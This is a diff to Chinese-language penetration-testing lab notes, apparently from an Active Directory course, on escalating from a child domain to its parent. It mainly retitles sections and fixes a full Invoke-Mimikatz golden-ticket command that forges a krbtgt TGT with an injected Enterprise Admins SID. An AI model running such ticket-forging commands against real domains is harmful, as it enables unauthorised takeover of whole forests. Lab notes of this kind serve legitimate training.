@@ -1,4 +1,4 @@
-# 子域到父域 （一）(Child to Parent)
+# 子域到父域 （一）(CIFS，访问文件系统)
 
 假设已经知道DA管理员Administrator的哈希
 ```
@@ -94,14 +94,15 @@ ls \\mcorp-dc.moneycorp.local\c$
 ```
 
 
-# 子域到父域 （二）(Child to Parent)
+# 子域到父域 （二）(以用户身份访问，可以执行shell)
+
+这里貌似只能使用krbtgt的账号
 
 下面命令制作一张用户krbtgt到父域的TGT
 由于之前我们已经拿到了krbtgt的hash值，这里直接使用
 ```
 PS C:\ad> . .\Invoke-Mimikatz.ps1
-PS C:\ad> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-
-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da267
+PS C:\ad> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da267
 96f35 /ticket:C:\AD\krbtgt_tkt.kirbi"'
 
   .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
@@ -224,7 +225,7 @@ Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarco
 
 查看目标计算机里的SharedwithDCorp文件夹
 ```
-s \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
+ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
 ```
 
 ## 方法二（rebuse.exe）
